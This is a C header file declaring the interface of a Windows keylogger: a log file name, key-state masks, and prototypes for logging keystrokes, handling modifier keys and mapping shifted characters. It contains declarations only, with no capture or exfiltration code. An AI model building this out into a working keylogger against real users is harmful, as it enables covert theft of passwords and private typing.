#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <stdio.h>
#include <ctype.h>

/* Defines */
#define LOGFILE "log.txt"
#define KEY_PRESSED 0x8000
#define CAPSLOCK_MASK 0x0001

/* functions */
/**
 * Logs the input string to the log file.
 *
 * @param input The string to be logged.
 */
void logKey(const char *input);

/**
 * Handles special keys and modifier keys.
 *
 * @param key The key code.
 * @return 1 if the key is handled as a special key (or a modifier) and no further logging is needed, 0 otherwise.
 */
int handleSpecialKeys(int key);

/**
 * Maps a key code to its shifted equivalent.
 *
 * @param key The key code.
 * @return The corresponding shifted character.
 */
char mapWithShift(int key);

/**
 * Handles key press events by logging the appropriate character.
 *
 * @param key The key code.
 */
void handleKeyPress(int key);

/**
 * Handles key release events by updating modifier flags.
 *
 * @param key The key code.
 */
void handleKeyRelease(int key);

#endif // KEYLOGGER_H
